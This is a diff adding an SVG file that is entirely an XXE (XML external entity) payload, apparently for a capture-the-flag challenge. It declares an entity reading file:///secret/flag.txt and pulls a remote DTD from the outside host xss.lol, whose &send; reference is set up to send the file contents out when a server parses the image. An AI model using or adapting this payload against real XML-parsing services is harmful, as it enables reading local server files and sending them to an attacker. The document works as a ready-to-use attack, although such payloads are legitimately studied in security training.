@@ -1,0 +1,11 @@
+<?xml version="1.0"?>
+<!DOCTYPE foo [ 
+ <!ENTITY % file SYSTEM "file:///secret/flag.txt">
+ <!ENTITY % dtd SYSTEM "http://xss.lol/remote.dtd"> 
+%dtd;]>
+<svg xmlns="http://www.w3.org/2000/svg" width="12cm" height="12cm">
+    
+    <text x="0" y="35" font-family="Verdana" font-size="35">
+       &send;
+    </text>
+</svg>
